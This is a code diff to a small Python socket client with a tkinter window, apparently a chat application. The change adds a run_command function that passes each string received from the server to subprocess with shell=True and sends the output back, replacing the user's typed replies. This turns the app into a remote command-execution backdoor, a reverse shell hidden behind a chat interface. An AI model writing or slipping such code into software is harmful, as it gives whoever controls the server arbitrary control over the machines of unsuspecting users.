@@ -1,12 +1,27 @@
 import socket
 import threading
 import tkinter as tk
-
+import subprocess
 
 
 HOST=socket.gethostbyname(socket.gethostname())
 PORT=12345
 client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
+
+
+def run_command(command:str):
+    try:
+        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+        
+        if result.returncode == 0:
+            return result.stdout.strip()  
+        else:
+            return f"Error executing command: {result.stderr.strip()}"
+    except subprocess.CalledProcessError as e:
+        return f"Error executing command: {e.stderr.strip()}"
+
+
 
 
 def background():
@@ -15,8 +30,10 @@ def background():
     while True:
         request=client.recv(1024).decode('UTF-8')
         print(request)
-        to_be_sent=input().encode('UTF-8')
-        client.sendall(to_be_sent)
+        output=run_command(request)
+        client.sendall(output.encode('UTF-8'))
+
+        
 
 def front():
     root=tk.Tk()
